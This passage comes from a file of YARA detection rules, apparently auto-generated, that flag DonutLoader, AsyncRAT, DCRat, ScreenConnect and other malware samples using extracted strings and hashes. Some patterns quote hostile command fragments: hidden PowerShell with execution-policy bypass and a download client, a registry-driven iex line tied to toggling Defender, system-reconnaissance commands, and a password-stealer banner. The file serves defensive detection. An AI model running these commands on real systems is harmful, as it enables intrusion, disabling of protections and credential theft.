      $s2 = "~w~o~i?C^J#w~t&P$I$2%c#C~k&j%Z!A?A^A#A~2&h$L A*A^A!w~2&O$+ w*2%F$u$f%0%I%p%9%K%I%t%9%i*J^B#Q~V&L%i E?w^z#U~0&/$5 f?a^8#N~0&I$T!i" ascii /* score: '12.00'*/
      $s3 = " i$E&K~L#t^I?S!g%Q*H&w%F~i$/&i~/#/^f?/!A%h*+ y$L&i$E&X~r#D^A?A!A$E*A u$/&v~P#I^z?i!e%B%0*l c%h^I B$z&S~L#i^0?/!7%D*S w$o&X~A#d^J" ascii /* score: '12.00'*/
      $s4 = "$+ A*Q%D!s?I^S#B~8&f$Q e*s%+!/#J~M&Y$Q#k#s!e A*/*H&U&B*0&B^A~G~6*B%Y%Q^S#U$H E*C^l%T#S I I*0%i!J~N^x#i M&t%9!M?F^l#9~i&I$p v*i%A" ascii /* score: '12.00'*/
      $s5 = "$Y!8?/^O!U*H%w!F?+^v$+ Z*e%B!6?g&Q$C R*J%y!E?z^L$2 E*K%k!w?U^i$E J*x%6!A?/&v#/ g*P%I!w?b^s#x 6*A%P!D?6^1$F A*6%D!m~k&A%A%P^I&S&O" ascii /* score: '12.00'*/
      $s6 = "$H!M?0?V&1%I!S?3^v#I A*A%A!g%g!p?n^H#B 3*+%A!C?L^i#E~0&F%t%I#S!Q?c^H#A~A&E%A A?9^E#w~R&N$+ v*/%J!L~F&6$I 3*U%j!I?B&9$i J*l%/!Y?I" ascii /* score: '12.00'*/
      $s7 = "*l?I?s~V~1 I S#A#A$Q#A$g$2%4%i^M^B^A^A*B*k*A&h*P?A~+ O$E^9^f^Q^N%y&Q&d*2$X&I&E*1*R*a*V~5!I 9!M!U!W$3%i%m%3$0^D^E*F*/*O&A&A&A&A&C" ascii /* score: '12.00'*/
      $s8 = "y*4&I^M%T$s#c!t!N e?3?O*R&o^s%f$M#J!Y~d + w?P*O&x^e%Y^V%H?t&R^+%i%O$/#a!z~i x?d*W*W&J^/%S$p#9!v~j Z?h?T*e&M^J%q$o#P#P!n~n q?P*S&" ascii /* score: '12.00'*/
      $s9 = "N%4$D#y!S~o 0?R?a*m&T^a%x$G&Q^E%/%S$8#3!p~/ O?A*n&W^N^0%p$J#4!y~S?q*W&a^A%X%m$u#+!I~Z z l?O$x#3!F~+ n H?T*o&B^E%1$o$t#Q!w~N Y?e*" ascii /* score: '12.00'*/
      $s10 = "R%O~5?t^C#G A&m#T O&a$k~Z^0^1#g H&s$3%I%L!+ 6&Y$v~E*5%k!3?K^S#B Y&O$5~o*h%i!R?H^D#e w&e$j~s*4%r!j?9^S#k T&e$r~U*D^g!5 k&j$G~/*H$" ascii /* score: '12.00'*/
      $s11 = "!f~1&D$P v*I%S!A~z&y$D I*J%/#/~3&n$+ y?o^/#8~i&I$V!i?d^B#g~/&g%/!H?U^j#C~d*n%A!4?P^4#/ B*1%I!E?P^t$I A*A%A%Q#A!Q?M^0#x#A#M!y!g!/" ascii /* score: '12.00'*/
      $s12 = "X?1 9 l 3 B t~B~U~r~P!3!c!a#L#B#p$Y$t$y$0%I%Z%E%y^l^r&L&q&p&y*l*1*G?Q?/?x?o~0&b*c*7?i?R + a~r~Q!r!p!J#5#W$/$Y$B%5%9^F^n^C&L&t*n*" ascii /* score: '12.00'*/
      $s13 = "^6^3%+%7%E%0$x$/$/$/$+#s#N#1#h!P!E!A!+!D + / / f~j~t~g~N~+&A&d&Q^v^D^A^A^A^Q^h^4%i%h%d%N%o%/%g$/$v$P$b$w$J#4#D#K#o#/#g!C!c!8^g&J" ascii /* score: '12.00'*/
      $s14 = "k%m!+?2^R$h b*J%b!A?E^B#p 9*W$g!N?m^v#i m&x$O!t?T^Y#+ f&n$O~q?N^F#C p&K$G!i?6^E#T 9&5%s!2?8^p#E b&2%M~C$I#Z^e*0 d#R%o%L#t w&i$7!" ascii /* score: '12.00'*/
      $s15 = "#c$n%w^7&Y*2?B~3 +!Q#Q#4$f%7^D&D*s?O~C!8#Y$7%D^I&N*0%i?I&h~8 t!P#0$w%d%C^v&j*Z*A?A#A$A$/%r^r&A%G%d^7&D*B?9~/~+ B!m#Z$6%A%A^Q&A*I" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 17000KB and
      1 of ($x*) and 4 of them
}

rule DonutLoader_signature__3 {
   meta:
      description = "_subset_batch - file DonutLoader(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6e9570672ffacc9de92c03836dd386362ede35716d1c1b85268f1e39fe325082"
   strings:
      $s1 = "* ~7#@~7'" fullword ascii /* score: '17.00'*/ /* hex encoded string 'w' */
      $s2 = "New Inqu.TXTPart.TXT" fullword ascii /* score: '11.00'*/
      $s3 = "* x7#@x7'" fullword ascii /* score: '9.00'*/
      $s4 = "cvcddqo" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 8000KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__16a1317a_AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_0 {
   meta:
      description = "_subset_batch - from files AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_16a1317a.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ff37506f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "16a1317ad2b3a3464c1c97066ce8329a96b226607760393c29eb145e8c7c666c"
      hash2 = "ff37506f2c1d82d61f2eadefe66a685d1142d29b7790d90b76c5969a282cc752"
   strings:
      $x1 = "powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebCli" wide /* score: '51.00'*/
      $x2 = "echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environ" wide /* score: '50.00'*/
      $x3 = "C:\\Users\\Administrator\\Desktop\\Venom Project\\BigEye Final(2025-04-06) Released\\HVNCDll\\obj\\Release\\hvnc.pdb" fullword ascii /* score: '43.00'*/
      $x4 = "ExecutionPolicy Bypass Start-Process -FilePath '\"" fullword wide /* score: '39.00'*/
      $x5 = "System.Data.SQLite.SEE.License, Version=1.0.115.5, Culture=neutral, PublicKeyToken={0}, processorArchitecture=MSIL" fullword wide /* score: '39.00'*/
      $x6 = "Microsoft.VSDesigner.Data.SQL.Design.SqlCommandTextEditor, Microsoft.VSDesigner, Version=8.0.0.0, Culture=neutral, PublicKeyToke" ascii /* score: '36.00'*/
      $x7 = "Microsoft.VSDesigner.Data.Design.DBCommandEditor, Microsoft.VSDesigner, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7" ascii /* score: '36.00'*/
      $x8 = "$script+=';iex((gp Registry::HKEY_Users\\S-1-5-21*\\Volatile* ToggleDefender -ea 0)[0].ToggleDefender)}'; $cmd='powershell '+$sc" ascii /* score: '34.00'*/
      $x9 = "$script+=';iex((gp Registry::HKEY_Users\\S-1-5-21*\\Volatile* ToggleDefender -ea 0)[0].ToggleDefender)}'; $cmd='powershell '+$sc" ascii /* score: '34.00'*/
      $x10 = "cmd.exe /k START " fullword wide /* score: '33.00'*/
      $x11 = " - Passwords Finder coded by Finder with Love <3" fullword wide /* score: '32.00'*/
      $x12 = "C:\\Temp\\client.log" fullword wide /* score: '32.00'*/
      $x13 = "C:\\Temp\\client_ex.log" fullword wide /* score: '32.00'*/
      $x14 = "ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -FilePath '\"" fullword wide /* score: '31.00'*/
      $x15 = "https://discordapp.com/api/v6/users/@me/billing/subscriptions" fullword wide /* score: '31.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _DCRat_signature__12e12319f1029ec4f8fcbed7e82df162_imphash__cfc77b95_DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_1 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash)_cfc77b95.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f9875282.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cfc77b951766dcdaee1adc05717ebb379972293ea21f8967dfc507e3b1f5e424"
      hash2 = "f9875282eec8dd6f9c8586ecc389cb28816c9feb7ce4ddff6720c47c4942d380"
   strings:
      $s1 = "CarjwfKZ7oSnkr7FP86.ymRgqlKlBklY4v6Q64G+rbVEBv8pZqxjQ1QFQtF+C0xjxO8FKXsCw5L8U4k`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '23.00'*/
      $s2 = "VnRuOkdyT6" fullword ascii /* base64 encoded string 'Vtn:GrO' */ /* score: '15.00'*/
      $s3 = "MkRWL3NafQ" fullword ascii /* base64 encoded string '2DV/sZ}' */ /* score: '14.00'*/
      $s4 = "PUMtcFlAMr" fullword ascii /* base64 encoded string '=C-pY@2' */ /* score: '14.00'*/
      $s5 = "bixBOTEtQd" fullword ascii /* base64 encoded string 'n,A91-A' */ /* score: '14.00'*/
      $s6 = "CarjwfKZ7oSnkr7FP86.ymRgqlKlBklY4v6Q64G+rbVEBv8pZqxjQ1QFQtF+C0xjxO8FKXsCw5L8U4k`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '14.00'*/
      $s7 = "NT98VCE8Jt" fullword ascii /* base64 encoded string '5?|T!<&' */ /* score: '11.00'*/
      $s8 = "Om1VOi47AP" fullword ascii /* base64 encoded string ':mU:.; ' */ /* score: '11.00'*/
      $s9 = "rDiuISMQOFTeyEiYAhq5" fullword ascii /* score: '10.00'*/
      $s10 = "ULQOLgETSA" fullword ascii /* score: '9.00'*/
      $s11 = "w8get9YeQuj0RxWWLKbf" fullword ascii /* score: '9.00'*/
      $s12 = "meX2SpYXHVPXG3sJFheF" fullword ascii /* score: '9.00'*/
      $s13 = "f9HMS4Y7XBMTNkt06Get" fullword ascii /* score: '9.00'*/
      $s14 = "YO8kXlOgPW" fullword ascii /* score: '9.00'*/
      $s15 = "J86ZcEYeLX18W2Wh1qLv" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__12e12319f1029ec4f8fcbed7e82df162_imphash__da0732b5_DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_2 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash)_da0732b5.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0d1f7174.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "da0732b540cf55107d03e09ffcf0d6c57a733c01a9ccac2c0fcd7ec2cf24f12d"
      hash2 = "0d1f717457b9300e23d20d37dd7482cbb588d0332c7fbd9b936469f6e917f49e"
   strings:
      $s1 = "uu5SjQmESPmvtDfBqU5.vSjPE2mNIGk0nUHM5YB+sLCsJAlpcjTAeXKd6Ty+WASioslMWMRyJORswbP`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "uu5SjQmESPmvtDfBqU5.vSjPE2mNIGk0nUHM5YB+sLCsJAlpcjTAeXKd6Ty+WASioslMWMRyJORswbP`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s3 = "LTUjOTBaJS" fullword ascii /* base64 encoded string '-5#90Z%' */ /* score: '14.00'*/
      $s4 = "MfCOMeTh0l" fullword ascii /* score: '12.00'*/
      $s5 = "dBKxBt6TeMp" fullword ascii /* score: '11.00'*/
      $s6 = "LkZ8dmlJSH" fullword ascii /* base64 encoded string '.F|viIH' */ /* score: '11.00'*/
      $s7 = "GFwhGEYeA7" fullword ascii /* score: '10.00'*/
      $s8 = "FtpxTFQUCU8" fullword ascii /* score: '10.00'*/
      $s9 = "jnTK8x6VSAylOgI7k4d" fullword ascii /* score: '9.00'*/
      $s10 = "oRhsugxlOg8dVb62sKFp" fullword ascii /* score: '9.00'*/
      $s11 = "n8GXv6ct0Gett9vovUAD" fullword ascii /* score: '9.00'*/
      $s12 = "CvepDlLjqy" fullword ascii /* score: '9.00'*/
      $s13 = "UyXxoppDLLV" fullword ascii /* score: '9.00'*/
      $s14 = "ve4FxYTftpM7hE5XOWf" fullword ascii /* score: '9.00'*/
      $s15 = "kE8ixaxEyE3btDo8FM3j" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__12e12319f1029ec4f8fcbed7e82df162_imphash__def52e7b_DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_3 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash)_def52e7b.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b072ea47.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "def52e7b2167ed5ff5d2e0b514558328efac9ddf0ece129dd9ce87046d43a6d3"
      hash2 = "b072ea4772e83b2881e8391a4e52d416e3d4bdf56f89abd3fb296bc2932a3747"
   strings:
      $s1 = "FcMQpuicB5558Ec1mEa.raLKd4iSN0fMa2WIIMU+PDhdbgL3x5d5qmy94jh+PTrw1FLCe26g3rq9ygZ`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "FcMQpuicB5558Ec1mEa.raLKd4iSN0fMa2WIIMU+PDhdbgL3x5d5qmy94jh+PTrw1FLCe26g3rq9ygZ`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s3 = "fiZhVVNGJ1" fullword ascii /* base64 encoded string '~&aUSF'' */ /* score: '15.00'*/
      $s4 = "cnNOOHxlIU" fullword ascii /* base64 encoded string 'rsN8|e!' */ /* score: '14.00'*/
      $s5 = "eHphZzQrI1n" fullword ascii /* base64 encoded string 'xzag4+#Y' */ /* score: '14.00'*/
      $s6 = "UXGHX1teMpCgAoB3n0mE" fullword ascii /* score: '11.00'*/
      $s7 = "TemPXlhlxjWiTE1x163Z" fullword ascii /* score: '11.00'*/
      $s8 = "HfTpdDrtr5" fullword ascii /* score: '10.00'*/
      $s9 = "DXfHHjhEOukgkeRIrccY" fullword ascii /* score: '9.00'*/
      $s10 = "Gn5sxx7iaBNIrCpwHQs" fullword ascii /* score: '9.00'*/
      $s11 = "LOghQ1BRvqT" fullword ascii /* score: '9.00'*/
      $s12 = "nHYQHPlOGj" fullword ascii /* score: '9.00'*/
      $s13 = "nXOfqshEftPCy2Qp3jFv" fullword ascii /* score: '9.00'*/
      $s14 = "uyDcXutZ5VQOVFtpSY9K" fullword ascii /* score: '9.00'*/
      $s15 = "se7JFChzBEyErIueFxtO" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__29a95575_DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_impha_4 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_29a95575.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_43647972.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_452896fa.exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4c940f9d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "29a955752a6b382e17a74244825f66d1cba8776f1c47ae908b1e9c9fc88a513d"
      hash2 = "43647972490c89b2f54bb84a4abdcf9037cc2f6d0768b9cdad9ec22deb935e11"
      hash3 = "452896fac3f4fea522f38b7974de9428b372bef3ccd30953ba7e808643312d11"
      hash4 = "4c940f9d7bd8b2397c93151446cf167acbde7afe5fb29205f3f58bf79d714ea0"
   strings:
      $s1 = "yj2KdtkDKNQDeyspW92.fBhxPFkveY0vbB384px+EFqx26kJnuTrqCcPl4A+wLDadIk8LxCpSnpQr8d`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "yj2KdtkDKNQDeyspW92.fBhxPFkveY0vbB384px+EFqx26kJnuTrqCcPl4A+wLDadIk8LxCpSnpQr8d`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s3 = "eGItTEhDR3" fullword ascii /* base64 encoded string 'xb-LHCG' */ /* score: '15.00'*/
      $s4 = "aHUmX3Q1QV" fullword ascii /* base64 encoded string 'hu&_t5A' */ /* score: '14.00'*/
      $s5 = "aDxGbyE2J1" fullword ascii /* base64 encoded string 'h<Fo!6'' */ /* score: '14.00'*/
      $s6 = "C2FCmdsPUOTsJDLlGM5" fullword ascii /* score: '12.00'*/
      $s7 = "sneXQpZL8SPyBrUSsYP" fullword ascii /* score: '9.00'*/
      $s8 = "zGdh2u0RftPrgwNUMHY" fullword ascii /* score: '9.00'*/
      $s9 = "GrdLl9xAGq" fullword ascii /* score: '9.00'*/
      $s10 = "BTwMmexaQ9np0Hetspy" fullword ascii /* score: '9.00'*/
      $s11 = "pEdO6RmrPhvVyZeyeiN" fullword ascii /* score: '9.00'*/
      $s12 = "brcpnyb6mifTpPO8KRx" fullword ascii /* score: '9.00'*/
      $s13 = "VXJED2JusIsPy1HW5Ye" fullword ascii /* score: '9.00'*/
      $s14 = "mx2AkQGFTPabHUT1fKd" fullword ascii /* score: '9.00'*/
      $s15 = "YrirCbwvi6ptr40blYE" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _ConnectWise_signature__9771ee6344923fa220489ab01239bdfd_imphash__ConnectWise_signature__9771ee6344923fa220489ab01239bdfd_im_5 {
   meta:
      description = "_subset_batch - from files ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash).exe, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash)_64049e05.exe, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash)_9c150d19.exe, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash)_d7231f53.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f756bec198768208848f3cf30d4439c47bdfe58f0fbd27cd6570295edbeaed64"
      hash2 = "64049e058f3414066b1b68f84306ec307670b4e93543888b6e40d8e18b74b718"
      hash3 = "9c150d1942236b0550489577f9373f97294f5431b256e2c5d2f706589b47873d"
      hash4 = "d7231f539456fe65fbc9633f08e098e62558b33763787f07fe6d3bac054cfcf6"
   strings:
      $x1 = "C:\\Users\\jmorgan\\Source\\cwcontrol\\Custom\\DotNetRunner\\DotNetResolver\\obj\\Debug\\DotNetResolver.pdb" fullword ascii /* score: '36.00'*/
      $x2 = "C:\\Users\\jmorgan\\Source\\cwcontrol\\Custom\\DotNetRunner\\Release\\DotNetRunner.pdb" fullword ascii /* score: '36.00'*/
      $x3 = "\\\\.\\Pipe\\TerminalServer\\SystemExecSrvr\\" fullword wide /* score: '31.00'*/
      $s4 = "ZSystem.UInt32, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s5 = "XSystem.Char, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089 " fullword ascii /* score: '27.00'*/
      $s6 = "XSystem.Byte, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s7 = "YSystem.Int16, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s8 = "IsCurrentProcessTokenUnelevatedAdministrator" fullword ascii /* score: '27.00'*/
      $s9 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s10 = "ScreenConnect.WindowsBackstageShell.exe" fullword wide /* score: '27.00'*/
      $s11 = "System.Security.Cryptography.AesCryptoServiceProvider, System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c56193" wide /* score: '27.00'*/
      $s12 = "ExecutedCommandEventID" fullword ascii /* score: '26.00'*/
      $s13 = "get_ShowTrayIconContextMenuStoreLoginCredentialsItem" fullword ascii /* score: '25.00'*/
      $s14 = "C:\\builds\\cc\\cwcontrol\\Product\\ClientInstallerRunner\\obj\\Release\\ScreenConnect.ClientInstallerRunner.pdb" fullword ascii /* score: '25.00'*/
      $s15 = "ScreenConnect.ClientInstallerRunner.exe" fullword wide /* score: '25.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 16000KB and pe.imphash() == "9771ee6344923fa220489ab01239bdfd" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _dcaf48c1f10b0efa0a4472200f3850ed_imphash__1a88146b_dcaf48c1f10b0efa0a4472200f3850ed_imphash__a990bd13_6 {
   meta:
      description = "_subset_batch - from files dcaf48c1f10b0efa0a4472200f3850ed(imphash)_1a88146b.exe, dcaf48c1f10b0efa0a4472200f3850ed(imphash)_a990bd13.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1a88146b43782a3547bcc06236a4b224592c1602a9691b58d60be1c08e4fa4b7"
      hash2 = "a990bd137feb5751e17c135c6b11fcaf6a7f09d1b3935b2d76ebfd0d53a2f027"
   strings:
      $s1 = "PNTNRNVNQNUNS" fullword ascii /* base64 encoded string '53Q5SP5CR' */ /* score: '16.50'*/
      $s2 = "ndSdsdCdc" fullword ascii /* base64 encoded string 'u'lt'\' */ /* score: '14.00'*/
      $s3 = "OWlJVlJUt" fullword ascii /* base64 encoded string '9iIVRT' */ /* score: '14.00'*/
      $s4 = "QQPQQQ" fullword ascii /* reversed goodware string 'QQQPQQ' */ /* score: '13.50'*/
      $s5 = "tmtmpmrmv" fullword ascii /* score: '11.00'*/
      $s6 = "abinagbg" fullword ascii /* score: '11.00'*/
      $s7 = "\\4:>%%%1" fullword ascii /* score: '10.00'*/ /* hex encoded string 'A' */
      $s8 = "56%656-6=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Vef' */
      $s9 = "5>:>&>6>.>>>!" fullword ascii /* score: '9.00'*/ /* hex encoded string 'V' */
      $s10 = "* cL\"g" fullword ascii /* score: '9.00'*/
      $s11 = "* +JK+" fullword ascii /* score: '9.00'*/
      $s12 = "pmwmumqms" fullword ascii /* score: '8.00'*/
      $s13 = "g%lVRf%\\" fullword ascii /* score: '8.00'*/
      $s14 = "zqvxqbzh" fullword ascii /* score: '8.00'*/
      $s15 = "vuvuqus" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and pe.imphash() == "dcaf48c1f10b0efa0a4472200f3850ed" and ( 8 of them )
      ) or ( all of them )
}

rule _AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__16a1317a_AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_7 {
   meta:
      description = "_subset_batch - from files AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_16a1317a.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ff37506f.exe, DiskWriter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4b4ac217.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "16a1317ad2b3a3464c1c97066ce8329a96b226607760393c29eb145e8c7c666c"
      hash2 = "ff37506f2c1d82d61f2eadefe66a685d1142d29b7790d90b76c5969a282cc752"
      hash3 = "4b4ac217ceb7224d712f2c8d6d3372cf5f581ab737af1d88f0b0e1b7731f3f07"
   strings:
      $x1 = "jSystem.CodeDom.MemberAttributes, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size," ascii /* score: '32.00'*/
      $s2 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s3 = " System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3amSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s4 = "get_GetProcessID" fullword ascii /* score: '20.00'*/
      $s5 = "MF_E_SINK_NO_SAMPLES_PROCESSED" fullword ascii /* score: '19.00'*/
      $s6 = "ersion=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089PADPADP" fullword ascii /* score: '18.00'*/
      $s7 = "Not an AIFF file - no AIFF/AIFC header." fullword wide /* score: '17.00'*/
      $s8 = "MF_E_NON_PE_PROCESS" fullword ascii /* score: '15.00'*/
      $s9 = "System.Collections.Generic.IEnumerator<NAudio.MediaFoundation.IMFActivate>.get_Current" fullword ascii /* score: '15.00'*/
      $s10 = "Video Processor" fullword ascii /* score: '15.00'*/
      $s11 = "_MFT_PROCESS_OUTPUT_STATUS" fullword ascii /* score: '15.00'*/
      $s12 = "MFT_PROCESS_OUTPUT_REGENERATE_LAST_OUTPUT" fullword ascii /* score: '15.00'*/
      $s13 = "qwNumSamplesProcessed" fullword ascii /* score: '15.00'*/
      $s14 = "qwByteCountProcessed" fullword ascii /* score: '15.00'*/
      $s15 = "MFT_INPUT_STREAM_PROCESSES_IN_PLACE" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e7b2bf7e_DCRat_signature__fcf1390e9ce472c7270447fc5c61a0c1_impha_8 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e7b2bf7e.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_3be674bc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e7b2bf7ed59c963d825828be2de6e88c8017354e2a91c7228c079dd6a76861c0"
      hash2 = "3be674bc5cbe26b2934b4d4e84651e10afc426d38c7787682f674b9edb77633f"
   strings:
      $s1 = "Qhk3DF05JKLPEWywV3m.OhXBJN08xdw94KOmeUh+UHf47U021bwLQAQqW11+rXGwrg0F2vqpU0J1QQE`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "Qhk3DF05JKLPEWywV3m.OhXBJN08xdw94KOmeUh+UHf47U021bwLQAQqW11+rXGwrg0F2vqpU0J1QQE`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s3 = "mTnlQcUM3" fullword ascii /* base64 encoded string 'NyPqC7' */ /* score: '15.00'*/
      $s4 = "TlpIYy0xdE" fullword ascii /* base64 encoded string 'NZHc-1t' */ /* score: '14.00'*/
      $s5 = "UmBMNy88QQ" fullword ascii /* base64 encoded string 'R`L7/<A' */ /* score: '14.00'*/
      $s6 = "IEFlUFNTSX" fullword ascii /* base64 encoded string ' AePSSI' */ /* score: '14.00'*/
      $s7 = "hWLOgEdJ7" fullword ascii /* score: '10.00'*/
      $s8 = "TxrFwMiRCj" fullword ascii /* score: '9.00'*/
      $s9 = "zGvrsV7AsVN4dLlrVxD" fullword ascii /* score: '9.00'*/
      $s10 = "FXAvgeTc1P" fullword ascii /* score: '9.00'*/
      $s11 = "z1mwBE7gEtEO5e8eg0S" fullword ascii /* score: '9.00'*/
      $s12 = "FRZvsWEepxLnD3LN7ib" fullword ascii /* score: '9.00'*/
      $s13 = "EscqU35GetAXLABw0KD" fullword ascii /* score: '9.00'*/
      $s14 = "KSeL9n4h4wcSPyV5Jrd" fullword ascii /* score: '9.00'*/
      $s15 = "zGEtVVW2bJamtwfQxJx" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _cbbf0c0e5419f1056e401b8955cb07c0_imphash__cbbf0c0e5419f1056e401b8955cb07c0_imphash__2771e4bb_cbbf0c0e5419f1056e401b8955cb07_9 {
   meta:
      description = "_subset_batch - from files cbbf0c0e5419f1056e401b8955cb07c0(imphash).exe, cbbf0c0e5419f1056e401b8955cb07c0(imphash)_2771e4bb.exe, cbbf0c0e5419f1056e401b8955cb07c0(imphash)_df89c633.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0edbb6150931c2970a547e7d1f9457cfc012194e96583386ab2b9dcfb8fde45d"
      hash2 = "2771e4bb8df2b285faafe71c278f3c65ab27631e5bdeafab3b05075f74f71489"
      hash3 = "df89c633af01d2b5d803e3f72a9398da78152fb7fdb0f1683e5e2ba067e69932"
   strings:
